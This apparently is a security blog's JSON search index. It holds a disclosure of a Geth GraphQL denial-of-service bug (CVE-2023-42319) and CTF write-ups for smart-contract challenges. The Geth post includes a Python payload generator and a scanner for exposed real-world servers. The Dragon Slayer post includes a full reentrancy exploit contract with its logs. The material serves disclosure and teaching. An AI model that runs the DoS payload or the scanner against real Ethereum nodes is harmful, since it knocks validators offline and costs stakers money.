[{"categories":["Web2"],"content":"CVE-2023-42319 : Geth - Denial Of Service through the GraphQL endpoint","date":"2023-10-15","objectID":"/posts/geth-dos-with-graphql/","tags":["Geth","DoS","GraphQL"],"title":"CVE-2023-42319 : Geth - DoS through GraphQL","uri":"/posts/geth-dos-with-graphql/"},{"categories":["Web2"],"content":"1. Introduction go-ethereum (Geth) is the most deployed Execution Layer for Ethereum. GraphQL is a query language for APIs, commonly seen in Web2 applications querying the blockchain. Geth proposes a GraphQL endpoint that can be activated by adding the option –http –graphql when starting the service. However, this component is buggy and subject to Denial Of Service because: It consumes a lot of resources. It is possible to perform unlimited GraphQL requests within a single HTTP request. The present research was conducted in during the month of June/July 2023, with the issue being sent to Geth team on July 4th 2023. ","date":"2023-10-15","objectID":"/posts/geth-dos-with-graphql/:1:0","tags":["Geth","DoS","GraphQL"],"title":"CVE-2023-42319 : Geth - DoS through GraphQL","uri":"/posts/geth-dos-with-graphql/"},{"categories":["Web2"],"content":"2. GraphQL batch of requests with aliases When GraphQL endpoint is activated, a new path is available on the RPC server showing a GraphQL interface: http://[@IP]:8545/graphql/ui Here is an example of a GraphQL query sent from the interface, to retrieve the current block number: The format of the GraphQL query is : query blockInfo() { block() { number } } Behind the scenes, when a GraphQL request is performed, the GraphQL request is encapsulated within a HTTP request : The concept of GraphQL aliases is to put multiple GraphQL queries within a simple HTTP request, like in the picture below: In terms of GraphQL syntax, it looks like this: query{ req01: block() { number } req02: block() { number } req03: block() { number } req04: block() { number } req05: block() { number } } The result of such a request is that the server will treat each GraphQL query individually, and return them within the same HTTP response. Batch Result From the GraphQL console This means that someone can ask the server to perform hundreds, even thousands of GraphQL operations within a single HTTP request, which can lead to resource exhaustion, therefore causing a Denial Of Service. ","date":"2023-10-15","objectID":"/posts/geth-dos-with-graphql/:2:0","tags":["Geth","DoS","GraphQL"],"title":"CVE-2023-42319 : Geth - DoS through GraphQL","uri":"/posts/geth-dos-with-graphql/"},{"categories":["Web2"],"content":"3. Exploitation When the GraphQL service is enabled on Geth, it is possible to retrieve all the possible requests and arguments of GraphQL by performing the GraphQL introspection query: {__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}} This request returns a large JSON, that can be uploaded on a website like GraphQL Voyager, or simply put in the InQL Scanner module for analysis: BurpSuite InQL Scanner Note: since Geth is public, it is also possible to retrieve this information from the source code. By analyzing the results, the logs query is interesting because the filter fromBlock means that the server would have to recompute, for each GraphQL query, all the logs from the mentioned block.This seems expensive in terms of resources. Using aliases for this query would look like this : query { request1: logs(filter: { fromBlock: 4188901 }) { data topics index transaction { gas } account(block: Long) { address } (...) } request99: logs(filter: { fromBlock: 4188999 }) { data topics index transaction { gas } account(block: Long) { address } } } The following python script can be used to generate a payload: #Usage: python3 generate.py block_start alias_number #Example: python3 generate.py 4188927 100 import argparse import json def generate_payload(start_block, num_aliases): payload = \"query {\\n\" for i in range(1, num_aliases + 1): request_name = f\"req{i:02d}\" from_block = start_block + i - 1 payload += f\" {request_name}: logs(filter: {{ fromBlock: {from_block} }}) {{\\n\" payload += \" data\\n\" payload += \" topics\\n\" payload += \" index\\n\" payload += \" transaction {\\n\" payload += \" gas\\n\" payload += \" }\\n\" payload += \" account(block: Long) {\\n\" payload += \" address\\n\" payload += \" }\\n\" payload += \" }\\n\" payload += \"}\\n\" return payload def main(): parser = argparse.ArgumentParser(description=\"Generate a JSON payload for aliases\") parser.add_argument(\"start_block\", type=int, help=\"Start block number\") parser.add_argument(\"num_aliases\", type=int, help=\"Number of aliases\") args = parser.parse_args() payload = generate_payload(args.start_block, args.num_aliases) with open(\"payload.json\", \"w\") as json_file: json_file.write(payload) if __name__ == \"__main__\": main() This will generate a payload.json file that can be sent through the GraphQL interface : GraphQL Console The tests were performed on a Sepolia full node, with 16Gb of RAM memory. The node was synced, Consensus client was prysm. Nothing else was running on the server. Geth version used is the latest stable at the time : 1.12.2-stable-bed84606. The first video shows that the node is living his life peacefully and is using 1.1Gb of RAM memory. Then, at 00:10 the following GraphQL request was sent: query { request1: logs(filter: { fromBlock: 4188927 }) { data topics index transaction { gas } account(block: Long) { address } } request2: logs(filter: { fromBlock: 4088927 }) { data topics index transaction { gas } account(block: Long) { address } } } This single HTTP request is performing only 2 GraphQL requests with aliases. When the request is fired, you can see: At 00:40, the RAM memory went up to 9,4Gb of RAM (+8.3Gb for 2 GraphQL requests) At the same time, request timeout on Web browser after 30 seconds (00:10 + 30 seconds) However, memory went up to 10.6Gb and did not decrease for at least the remaining two minutes (sometimes, it decrea","date":"2023-10-15","objectID":"/posts/geth-dos-with-graphql/:3:0","tags":["Geth","DoS","GraphQL"],"title":"CVE-2023-42319 : Geth - DoS through GraphQL","uri":"/posts/geth-dos-with-graphql/"},{"categories":["Web2"],"content":"4. Vulnerable servers in the wild By using Shodan, looking for Geth servers having port 8445 port opened, it is possible to find a bit more than 8000 servers with Geth exposed. Among those, over 80 had the vulnerable GraphQL endpoint exposed. The script below was used to identify vulnerable servers among the 8000 ones: import requests import threading # Input file containing IP addresses from Shodan input_file = \"input.txt\" # Output file to save GraphQL URIs output_file = \"graphql_uris.txt\" # Function to check an IP address and save GraphQL URIs def check_ip(ip): # Add \"http://\" to the IP address url = f\"http://{ip}\" # Append \"/graphql/ui\" to the URL graphql_url = f\"{url}:8545/graphql/ui\" try: # Send an HTTP GET request response = requests.get(graphql_url) # Check if the response status code is 200 (OK) if response.status_code == 200 and \"graphiql\" in response.text.lower(): # Print the \"200 OK\" result print(f\"{graphql_url} - OK\") with open(output_file, \"a\") as f: f.write(f\"{graphql_url}\\n\") except: pass #print(\"Error with ip \" + str(ip)) # Read IP addresses from the input file with open(input_file, \"r\") as f: ips = f.readlines() # Define a lock to ensure thread-safe writing to the output file output_file_lock = threading.Lock() # Function to process IPs in parallel def process_ips(start, end): for i in range(start, end): ip = ips[i].strip() # Remove leading/trailing whitespace if ip: check_ip(ip) # Split the list of IPs into chunks for parallel processing num_threads = 10 chunk_size = len(ips) // num_threads threads = [] for i in range(num_threads): start = i * chunk_size end = start + chunk_size if i \u003c num_threads - 1 else len(ips) thread = threading.Thread(target=process_ips, args=(start, end)) threads.append(thread) thread.start() # Wait for all threads to finish for thread in threads: thread.join() This is not a big number, but those servers might have a validator running using those vulnerable instances. Putting Geth down would cause the stakers financial harm since they could not validate attestations (they would even get penalties) and they could not participate in block proposals. ","date":"2023-10-15","objectID":"/posts/geth-dos-with-graphql/:4:0","tags":["Geth","DoS","GraphQL"],"title":"CVE-2023-42319 : Geth - DoS through GraphQL","uri":"/posts/geth-dos-with-graphql/"},{"categories":["Web2"],"content":"5. Ethereum response Geth team was very reactive and professional. Because the GraphQL feature is an option, it is out of scope of the Ethereum Bug Bounty program. More surprisingly, the team has no intention of fixing the issue. This seems to be tied to the fact that they consider that RPC port should be blocked in terms of Firewalling. Firewall Disclamer From Ethereum Fondation This however does not eliminate the issue and it is not difficult to find and exploit vulnerable servers in the wild. After discussing with the team, they have decided to update the Security page of Geth to warn users about exposing the GraphQL endpoint : Mail from Ethereum Fondation Since September 5th, the Geth webpage was updated. A special part regarding API Security was added, mentioning GraphQL among other topics : ","date":"2023-10-15","objectID":"/posts/geth-dos-with-graphql/:5:0","tags":["Geth","DoS","GraphQL"],"title":"CVE-2023-42319 : Geth - DoS through GraphQL","uri":"/posts/geth-dos-with-graphql/"},{"categories":["Web3"],"content":"Writeup on the first challenge of MevSec.","date":"2023-04-01","objectID":"/posts/mevsec-introduction/","tags":["Foundry","MevSec","Cast","Web3"],"title":"MevSec writeup Introduction","uri":"/posts/mevsec-introduction/"},{"categories":["Web3"],"content":"Introduction MevSec is a community focused on web3 security. To ensure the people has the require knowledge and permits to have a healthy community, we decided to create a CTF (Capture the Flag). The goal is to flag the challenges on the ctf.mevsec.com to have at least 300 points. Once you get the 300 score points, you can join the community 😎 Today, we will solve the first challenge together to show you how it works 🎉 The challenge statement is as follows: Challenge will be solved when there is no funds left inside the wallet. Hope you will join us ! ","date":"2023-04-01","objectID":"/posts/mevsec-introduction/:1:0","tags":["Foundry","MevSec","Cast","Web3"],"title":"MevSec writeup Introduction","uri":"/posts/mevsec-introduction/"},{"categories":["Web3"],"content":"1. Introduction MevSec is a community focused on web3 security. To ensure the people has the require knowledge and permits to have a healthy community, we decided to create a CTF (Capture the Flag). The goal is to flag the challenges on the ctf.mevsec.com to have at least 300 points. Once you get the 300 score points, you can join the community 😎 ","date":"2023-04-01","objectID":"/posts/mevsec-introduction/:2:0","tags":["Foundry","MevSec","Cast","Web3"],"title":"MevSec writeup Introduction","uri":"/posts/mevsec-introduction/"},{"categories":["Web3"],"content":"2. Solidity challenge Today, we will solve the first challenge together to show you how it works. The challenge statement is as follows: Challenge will be solved when there is no funds left inside the wallet. Hope you will join us ! Challenge Intro from ctf.mevsec.com. First, we need to download the challenge, and open it our favorite text editor. Dowload the source code from ctf.mevsec.com. The setup.sol is the contract that will initialized the contract (this contract is used by the team to generate the challenge and showing what is necessary to solve the challenge). contract Setup { VideoChallengeIntro public vci; constructor() payable { require(msg.value \u003e= 100, \"Not enough ETH to create the challenge..\"); vci = (new VideoChallengeIntro){ value: 100 ether }(); } function isSolved() public view returns (bool) { //IsSolved() need to return `true` to solve the challenge. return address(vci).balance == 0; } } The setup will create the challenge by creating the contract VideoChallengeIntro in the line: vci = (new VideoChallengeIntro){ value: 100 ether }(); //In this Challenge, 100 ether has been sent to the contract. If we are looking closely the function isSolved() This function will return true , if the balance of the challenge is set to 0. We can directly see that the goal of the challenge is to empty the balance of contract VCI. Now, the file VideoChallengeIntro.sol this file contains the contract VideoChallengeIntro : contract VideoChallengeIntro { //The VaultMEVSec contains 100ETH could you succeed to steal them? address public owner; modifier onlyOwner() { require(msg.sender == owner); _; } constructor() payable { require(msg.value == 100 ether, \"100ETH required for the start the challenge\"); owner = msg.sender; // Set the Owner when we call the constructor } function balance() public view returns (uint256) { //Return the Balance of the contract. return address(this).balance; } function withdraw() public onlyOwner { //Only the owner can withdraw the contract balance. payable(owner).transfer(address(this).balance); // Transfer the balance to the owner } function setOwner() public { //Set the owner of the contract. owner = msg.sender; } } We can clearly see that the function withdraw() will transfer all the funds (the 100 ether inside in the contract). However, this function is protected by the modifier onlyOwner() meaning only the owner of the contract can call this function… Here, this our lucky day because the contract implement a function setOwner() not protected.. Meaning anyone can call the function and take the owner of the current contract. So to exploit the contract we can do the following steps: Become owner by calling the function SetOwner() . Steal the ALL the ether from the contract by calling the function withdraw() . Now how to do it using the infrastructure of MevSec and flag the challenge? To start the challenge we need to use curl : curl 'http://5.196.27.132:8080/create_challenge?challenge_number=0' Curl to create a instances of the challenge. Then, we will all the necessary informations to solve the challenge. Parameters RPC link created for the challenges. http://ctf.mevsec.com:50323/ Setup Address contract The address of the Setup contract, if you need the address of the real challenge contract just check the storage or call the variable vci() (we will do later on this demo) Contract Address Ethereum (20 bytes) of the challenger 0x133756e1688E475c401d1569565e8E16E65B1337 Private key of the challenger to sign transaction and discuss with the blockchain 0xedbc6d1a8360d0c02d4063cdd0a23b55c469c90d3cfbc2c88a015f9dd92d22b3 UniqueID The unique instance that will be created for you and will be running for 20 minutes. d3e87459ba9a4e54b6b74b2946dfb3f133fafdc4dcd715ebd2024642117e076a ","date":"2023-04-01","objectID":"/posts/mevsec-introduction/:3:0","tags":["Foundry","MevSec","Cast","Web3"],"title":"MevSec writeup Introduction","uri":"/posts/mevsec-introduction/"},{"categories":["Web3"],"content":"3. Process to flag. Using cast we can get the contract vci by using the RPC and the Contract Address using the signature vci() . Cast call to get the address of vci contract. Using cast we get the balance using the using the RPC and the address of the challenge. cast balance to get the balance of the current challenge. Using cast we can send a transaction to the address of the challenge and calling the function setOwner() using RPC and the Private Key cast send to send transaction with the function `setOwner()` Using cast we can send a transaction to the address of the challenge and calling the function withdraw() using RPC and the Private Key cast send to send transaction with the function `withdraw()` Using the curl on the curl 'http://5.196.27.132:8080/ we can see all the possible options. CURL to see all the options available including `get_flag`. To flag the challenge because we have call withdraw() and we steal all the funds we need to use curl with the /get_flag on our UniqueID. Reminder the instances will be destroy after 20 minutes, don’t hesitate to recreate a instance. CURL the get_flag with the UniqueID to flag the challenge. Voila! Now You got the flag! 😎 Now it’s your turn starting to flag challenge the others to join us and also create new challenges for the new comers! 🔥 Good luck! ","date":"2023-04-01","objectID":"/posts/mevsec-introduction/:4:0","tags":["Foundry","MevSec","Cast","Web3"],"title":"MevSec writeup Introduction","uri":"/posts/mevsec-introduction/"},{"categories":["Web3"],"content":"4. Socials. Discord (Join us!) Github Twitter https://discord.gg/54Q9pnpQcV https://github.com/Ethnical/Swek3 https://twitter.com/EthnicalInfo ","date":"2023-04-01","objectID":"/posts/mevsec-introduction/:5:0","tags":["Foundry","MevSec","Cast","Web3"],"title":"MevSec writeup Introduction","uri":"/posts/mevsec-introduction/"},{"categories":["Web3"],"content":"A homemade flashloan using a reentrancy to kill this damn dragon!","date":"2023-03-12","objectID":"/posts/hacktm-dragon-slayer/","tags":["PoC","EVM","REEANTRANCY","ERC721","FLASHLOAN"],"title":"HackTM - Dragon Slayer","uri":"/posts/hacktm-dragon-slayer/"},{"categories":["Web3"],"content":"Introduction The 19 February 2023 the HackTM CTF has been launched. The CTF has 2 smarts contract challenges. Both of them were on Solidity. This writeup will cover the first challenge, Dragon Slayer the goal of the challenge is to kill the Dragon! Let’s download the challenges and see what we have here. We have 9 contracts describe as follow: Contract Name Purpose Bank Bank permit to store the GoldCoin Also transfer GoldCoin to another bank account (using the bankNotes) BankNote An ERC721 (NFT) used to store the amount of GoldCoin deposited or transfered. Dragon The Dragon is the enemy we want to kill! The Dragon has health set 1 000 000. GoldCoin The ERC20 token this is the money of the game and can be used into the Shop to buy some Item Item The Item that the Knight can equip like Sword or Shield (Items are stored in the store). Knight The Knight We are the Knight, we can attack the Dragon, also equip Item previously bought into the Shop, also deposit or withdraw money from the our Bank account. The health is set to 10 (Health of the Knight) Setup The Setup is the to create the contract and initialize the challenge (cf. Paradigm CTF or MevSec Challenge). This will create the Knight and give to the Knight (a bad quality Sword + Shield that make less damage) so there are not sufficient to fight the Dragon. Shop The Shop is the place where you can buy/sell Item used by the Knight (Sword, Shield). It’s worth noting, inside the Shop there is 2 Itemthat are really powerful but extremely expensive (The currency of the Shop is GoldCoin) As usual the setup.sol permits to initialize the challenge so let’s see how the challenge is created ⬇️ function isSolved() external view returns (bool) { return knight.health() \u003e 0 \u0026\u0026 knight.dragon().health() == 0; } The challenge will be solved when the health of the Dragon will be at 0 and the Knight is still alive! Just to recap, this is a scheme to understand the challenge. Scheme of the challenge. Obviously, if we are trying to attack the dragon with the first equipment (SWORD, SHIELD) provided at the beginning by the creator, we will die instantly. Screenshot of the first weapons provided in the challenge. Because the health of the dragon is 1_000_000 if we attack with the first SWORD we will only make 1 damage.. But the last SWORD of the Shop is extremely powerful but also extremely expensive! The last items of the SHOP, really powerful weapons (1m damage/defense). With this equipment we should succeed to kill the dragon ⇒ (1_000_000 Attack + 1_000_000 defense) ","date":"2023-03-12","objectID":"/posts/hacktm-dragon-slayer/:1:0","tags":["PoC","EVM","REEANTRANCY","ERC721","FLASHLOAN"],"title":"HackTM - Dragon Slayer","uri":"/posts/hacktm-dragon-slayer/"},{"categories":["Web3"],"content":"1. Dragon The Dragon attack is extremely powerful (the minimum attack damage is the clawAttack of 1 000 000 damages). clawAttack = 1_000_000; fireAttack = 10_000_000; defence = 500_000; This will be used In the function fightDragon() : function fightDragon() public onlyOwner onlyAlive { (uint dragonDamage, bool isFire) = dragon.doAttack(); _receiveAttack(dragonDamage, isFire); if (health \u003e 0) { dragon.receiveAttack(attack); } } function _receiveAttack(uint damage, bool isFire) private { if (isFire \u0026\u0026 hasAntiFire) { return; } uint damageDone; if (damage \u003e defence) { damageDone = damage - defence; } if (damageDone \u003e health) { damageDone = health; } health -= damageDone; } When the knight is attacking the dragon by calling fightDragon() The function will also trigger the attack of the Dragon because of the function calls dragon.doAttack(). If we are looking closely: Only if we survive (means the health of our Knight\u003e 0) the attack can make damage to the Dragon… However, the dragon is too powerful (1_000_000 damage with the clawAttack) and will one shot our knight after during our first attack… But not always! ","date":"2023-03-12","objectID":"/posts/hacktm-dragon-slayer/:1:1","tags":["PoC","EVM","REEANTRANCY","ERC721","FLASHLOAN"],"title":"HackTM - Dragon Slayer","uri":"/posts/hacktm-dragon-slayer/"},{"categories":["Web3"],"content":"2. Immunity to fire Inside the if statement, we can clearly see that the attack of the dragon is reducing our health in the code inside the red rectangle. But the first if, permits to bypass the damage from the dragon! (this is the immunity to fire). So inside this block the return be call before updating anything and will not reduce the health of the Knight. ","date":"2023-03-12","objectID":"/posts/hacktm-dragon-slayer/:1:2","tags":["PoC","EVM","REEANTRANCY","ERC721","FLASHLOAN"],"title":"HackTM - Dragon Slayer","uri":"/posts/hacktm-dragon-slayer/"},{"categories":["Web3"],"content":"3. Fire Immunity how it’s works? The hasAntiFire boolean attribut is only on the last SHIELD of the shop (the best SHIELD that cost 1_000_000 ether). If we got the last SHIELD equiped on our knight then we can callfightDragon() until the dragon is dead (because we will be immune to fire and make 1 damage each call right?) No actually… Because the dragon will change of attack every 5 attacks he will use the clawAttack and oneshot our knight… So we need to kill him faster than 5 attacks… Hopefully, the two last Items of the shop permits to kill the dragon faster than the 5 attacks maximal : Items Specifications Cost in GoldCoin Sword (Abyssal Whip) 1_000_000 damages 1_000_000 GoldCoin Shield (Dragonfire Shield) 1_000_000 defense + immune to Fire Attack (perfect!) 1_000_000 GoldCoin So this is perfect we have a plan of attack to kill the dragon but wait a minutes? The knight has only 10 GoldCoin…. So, the goal of the challenge is to find a way to get the enough money to buy both of the equipments (SHIELD, SWORD) and fight the dragon. ","date":"2023-03-12","objectID":"/posts/hacktm-dragon-slayer/:1:3","tags":["PoC","EVM","REEANTRANCY","ERC721","FLASHLOAN"],"title":"HackTM - Dragon Slayer","uri":"/posts/hacktm-dragon-slayer/"},{"categories":["Web3"],"content":"4. Vulnerability Searching So to start to find an entry point to exploit the challenge we should start by the contracts that manipulated the GoldCoin as we know this will be probably related to the money of the game, because we need to have 2_000_000 GoldCoin ⇒ A interesting contract related to the GoldCoin is the bank 💰 contract . // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; import \"./openzeppelin-contracts/utils/Counters.sol\"; import \"./GoldCoin.sol\"; import \"./BankNote.sol\"; contract Bank { using Counters for Counters.Counter; uint constant INITIAL_AMOUNT = 10 ether; Counters.Counter private _ids; GoldCoin public goldCoin; BankNote public bankNote; mapping(uint =\u003e uint) public bankNoteValues; constructor() { goldCoin = new GoldCoin(); bankNote = new BankNote(); goldCoin.mint(msg.sender, INITIAL_AMOUNT); } function deposit(uint amount) external { require(amount \u003e 0, \"ZERO\"); goldCoin.burn(msg.sender, amount); _ids.increment(); uint bankNoteId = _ids.current(); bankNote.mint(msg.sender, bankNoteId); bankNoteValues[bankNoteId] = amount; } function withdraw(uint bankNoteId) external { require(bankNote.ownerOf(bankNoteId) == msg.sender, \"NOT_OWNER\"); bankNote.burn(bankNoteId); goldCoin.mint(msg.sender, bankNoteValues[bankNoteId]); bankNoteValues[bankNoteId] = 0; } function merge(uint[] memory bankNoteIdsFrom) external { uint totalValue; for (uint i = 0; i \u003c bankNoteIdsFrom.length; i++) { uint bankNoteId = bankNoteIdsFrom[i]; require(bankNote.ownerOf(bankNoteId) == msg.sender, \"NOT_OWNER\"); bankNote.burn(bankNoteId); totalValue += bankNoteValues[bankNoteId]; bankNoteValues[bankNoteId] = 0; } _ids.increment(); uint bankNoteIdTo = _ids.current(); bankNote.mint(msg.sender, bankNoteIdTo); bankNoteValues[bankNoteIdTo] += totalValue; } function split(uint bankNoteIdFrom, uint[] memory amounts) external { uint totalValue; require(bankNote.ownerOf(bankNoteIdFrom) == msg.sender, \"NOT_OWNER\"); for (uint i = 0; i \u003c amounts.length; i++) { uint value = amounts[i]; _ids.increment(); uint bankNoteId = _ids.current(); bankNote.mint(msg.sender, bankNoteId); bankNoteValues[bankNoteId] = value; totalValue += value; } require(totalValue == bankNoteValues[bankNoteIdFrom], \"NOT_ENOUGH\"); bankNote.burn(bankNoteIdFrom); bankNoteValues[bankNoteIdFrom] = 0; } function transferPartial(uint bankNoteIdFrom, uint amount, uint bankNoteIdTo) external { require(bankNote.ownerOf(bankNoteIdFrom) == msg.sender, \"NOT_OWNER\"); require(bankNoteValues[bankNoteIdFrom] \u003e= amount, \"NOT_ENOUGH\"); bankNoteValues[bankNoteIdFrom] -= amount; bankNoteValues[bankNoteIdTo] += amount; } function transferPartialBatch(uint[] memory bankNoteIdsFrom, uint[] memory amounts, uint bankNoteIdTo) external { uint totalValue; for (uint i = 0; i \u003c bankNoteIdsFrom.length; i++) { uint bankNoteId = bankNoteIdsFrom[i]; uint value = amounts[i]; require(bankNote.ownerOf(bankNoteId) == msg.sender, \"NOT_OWNER\"); require(bankNoteValues[bankNoteId] \u003e= value, \"NOT_ENOUGH\"); bankNoteValues[bankNoteId] -= value; } bankNoteValues[bankNoteIdTo] += totalValue; } } The bank contract can mint GoldCoin to the msg.sender . (This a real central bank here 👋 CBDC). Withdraw() with `mint()` function. After a quick analysis, the Bank has no reentrancy guard implemented… There is multiples mint() actually (3 mints in the contract): We know that the mint() can lead to reeantrancy with ERC721. So we will looks potentials interested functions: split() ⇒ Using ERC721 ⚠️ (BankNote is an ERC721) ⚠️ Split() with `mint()` function. merge() ⇒ This is one is ERC721 ⚠️ (BankNote is an ERC721) ⚠️ Merge() with `mint()` function. withdraw() ⇒ Is using ERC20 so this is safe to use no need to check here. Using ERC721 or ERC1155 we have to be extremely careful with the mint() because this will callback the safemint function (so .mint() ➡️ _safemint() and a has the callback on onERC721Received that can lead to reentrancy). ","date":"2023-03-12","objectID":"/posts/hacktm-dragon-slayer/:1:4","tags":["PoC","EVM","REEANTRANCY","ERC721","FLASHLOAN"],"title":"HackTM - Dragon Slayer","uri":"/posts/hacktm-dragon-slayer/"},{"categories":["Web3"],"content":"5. Homemade Flashloan Now, if we are looking closely the function split() we can make create a “flashloan” using a reentrancy! (But we have to be an holder of a bankNote to do that explain later on). require(bankNote.ownerOf(bankNoteIdFrom) == msg.sender, \"NOT_OWNER\");//This will check if you are owner of the bankNoteIdFrom Let’s explain what is going on here: Because the function split() permits to mint a value to msg.sender. Split() flashloan using reantrancy. The amounts is a uint[] this will be the amount to flashloan. Here, [2_000_000,0] should do the flashloan for us. Then the value will be the amount of index so for the index(0) ⇒ 2_000_000. ⚠️ The contract will mint a bankNote associate with the value and jump into the onERC721Received of the contract using the callback. The value of 2_000_000 is set inside the BankNotesValues[]. Don’t forget we have to sendback the money back otherwise this will revert at the end. Call the function withdraw() below, with bankNoteId of the step 3 this will mint the value of the tokens previously written in the step 4. withdraw() function that mint goldCoin. And we will receive the money! That’s exactly what we are looking for! This will finally help us to buy some stuffs to kill this damn dragon! Also we have to keep in mind to have a array of length ≥ 2. index Value uint[0] 2_000_000 uint[1] 0 If we are using a length of 1, then this will jump into the onERC721Received of the contract using the callback but without updating the BankNotesValues[] and then we won’t be able to call the function withdraw() (who burn the banknotes and mint the money). ","date":"2023-03-12","objectID":"/posts/hacktm-dragon-slayer/:1:5","tags":["PoC","EVM","REEANTRANCY","ERC721","FLASHLOAN"],"title":"HackTM - Dragon Slayer","uri":"/posts/hacktm-dragon-slayer/"},{"categories":["Web3"],"content":"6. Be the owner of an NFT As we previously speak, to trigger the flashloan and generate the money (to buy a powerful SWORD \u0026 SHIELD) we have to bypass this check by holding an NFT… require(bankNote.ownerOf(bankNoteIdFrom) == msg.sender, \"NOT_OWNER\");//This will check if you are owner of the bankNoteIdFrom Here, this is kind of a jail for the ERC721(bankNote) / ERC20(goldCoin) you cannot transfer them outside the authorized contracts of the ecosystem (if we look there is no features to transfer to another contract damn it!!) . I was stuck here… But actually there is another vulnerability into the bank contract that can lead to the minting of the ERC721 into the function merge() of a external contract. Merge function can bypass if the size is 0 and free mint. Bypass the for statement that contains the check on the msg.sender (that will revert) using the size of bankNoteIdsFrom = 0 (empty tab). Increment the NFT id to mint(). Then mint the NFT id from the step 2 (with the ids.increment()). Update the value of bankNoteValues[] with 0 (not really important). We finally succeed to mint an NFT! The fact that the banknotes will be set to 0 is not important here as we only want to have the NFT to trigger the reantrancy into the flashloan trick 🏴‍☠️ ","date":"2023-03-12","objectID":"/posts/hacktm-dragon-slayer/:1:6","tags":["PoC","EVM","REEANTRANCY","ERC721","FLASHLOAN"],"title":"HackTM - Dragon Slayer","uri":"/posts/hacktm-dragon-slayer/"},{"categories":["Web3"],"content":"Final Step So this the final steps to produce the attack and kill this dragon: Mint an NFT using merge(). Flashloan 2_000_000 GoldCoin using our homemade flashloan using split(). Sending the money to the knight contract. Buying the 2 super items using buyItem(*4*) \u0026 buyItem(3) Abyssal Whip (SWORD) Dragonfire Shield (SHIELD) Equip the new items (Abyssal Whip, Dragonfire Shield) using equipItem(3) \u0026 equipItem(4). Fight the Dragon x2 times (because the dragon has Health + Shield) through fightDragon(). After killing the dragon, we can sell our items via (sellItem(*3*) \u0026 sellItem(4)) to get back our 2_000_000 Goldcoins. Deposit our money back to the bank using bankDeposit(*2_000_000* ether). Last but not least, we have to transfer the money to correct bankNoteValues[ID] If we have borrowed at the id = 1 we must transfer the money to the bankNoteValues[1] to ensure this require will not fail otherwise the value won’t be to correct BankNotes. BankNoteIdFrom have to set accordingly with the borrowed `ID`. To do this, we can use the function transferPartial() that will switch the id to the wanted one! TransferPartial can be use to move BankNotes to another `id`. Voilaaaa! What a nice challenge from 0xKasper didn’t have the time to dive into the CTF… But this will obviously give some new idea of challenges for ctf.mevsec.com ","date":"2023-03-12","objectID":"/posts/hacktm-dragon-slayer/:2:0","tags":["PoC","EVM","REEANTRANCY","ERC721","FLASHLOAN"],"title":"HackTM - Dragon Slayer","uri":"/posts/hacktm-dragon-slayer/"},{"categories":["Web3"],"content":"Socials \u0026 Payload Discord (Join us!) Github Twitter https://discord.gg/54Q9pnpQcV https://github.com/Ethnical/Swek3 https://twitter.com/EthnicalInfo // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/Test.sol\"; import \"src/Setup.sol\"; contract PoC is Script, Test { uint256 internal increment; Setup S = new Setup(); Knight K = Knight(S.knight()); Dragon D = Dragon(S.knight().dragon()); GoldCoin G = GoldCoin(S.knight().goldCoin()); Shop Sh = Shop(S.knight().shop()); Bank B = Bank(S.knight().bank()); Item I = Item(S.knight().item()); function setUp() public {} function run() public { S.claim(); emit log_named_address(\"The Knight address\", address(S.knight())); //emit log_named_uint(\"The Knight is alive\", K.health() \u003e 0); emit log_named_uint(\"Health of the knight\", K.health()); emit log_named_uint(\"Health of the Dragon\", D.health()); emit log_named_uint( \"The number of gold piece of BANK\", G.balanceOf(address(B)) / 1 ether ); emit log_named_uint( \"The number of gold piece\", G.balanceOf(address(K)) / 1 ether ); uint[] memory bankNoteIdsFrom = new uint[](1); uint[] memory amounts = new uint[](1); bankNoteIdsFrom[0] = 1; amounts[0] = 1; uint[] memory accounts = new uint[](0); B.merge(accounts); uint[] memory split_amount = new uint[](2); split_amount[0] = 2_000_000 * 1 ether; split_amount[1] = 0; B.split(1, split_amount); } function onERC721Received( address, address, uint256, bytes calldata ) public returns (bytes4) { if (increment == 0) { increment++; return this.onERC721Received.selector; } if (increment \u003e 1) { B.bankNoteValues(2); B.withdraw(2); G.approve(address(Sh), type(uint256).max); Sh.buyItem(4); Sh.buyItem(3); I.safeTransferFrom(address(this), address(K), 3, 1, new bytes(0)); I.safeTransferFrom(address(this), address(K), 4, 1, new bytes(0)); K.equipItem(4); K.equipItem(3); K.fightDragon(); //Weird as fuck should one oneshot here K.fightDragon(); K.sellItem(3); K.sellItem(4); emit log_named_uint( \"The number of gold piece\", G.balanceOf(address(K)) / 1 ether ); K.bankDeposit(2_000_000 ether); K.bankTransferPartial(4, 2_000_000 ether, 1); emit log_named_uint(\"Health of the Dragon\", D.health()); emit log_named_uint(\"Health of the knight\", K.health()); } increment++; return this.onERC721Received.selector; } function onERC1155Received( address, address, uint256, uint256, bytes calldata ) public pure returns (bytes4) { return this.onERC1155Received.selector; } } Results of the payload: Script ran successfully. == Logs == The Knight address: 0x7aacc5300ec7ac58fe86645d08f21b1becadf99a Health of the knight: 10 Health of the Dragon: 1000000 The number of gold piece of BANK: 0 The number of gold piece: 10 The number of gold piece: 2000010 Health of the Dragon: 0 Health of the knight: 10 ","date":"2023-03-12","objectID":"/posts/hacktm-dragon-slayer/:3:0","tags":["PoC","EVM","REEANTRANCY","ERC721","FLASHLOAN"],"title":"HackTM - Dragon Slayer","uri":"/posts/hacktm-dragon-slayer/"},{"categories":["Web3"],"content":"Writeup of web3 challenge of 404CTF 2022 - contracts war 1/2","date":"2023-01-26","objectID":"/posts/writeup-404ctf-22/contractswar1/","tags":["foundry","solidity","golang","web3","CTF","404CTF"],"title":"Writeup 404CTF 2022 - Contracts war 1 (web3)","uri":"/posts/writeup-404ctf-22/contractswar1/"},{"categories":["Web3"],"content":"Statement The challenge statement is as follows: Agent, we discovered a smart contract from Hallebarde that allows you to get free money. It is also used to authenticate as a new member of Halberd. We want you to pretend to be one of their members. We recently found an endpoint that appears to be their login 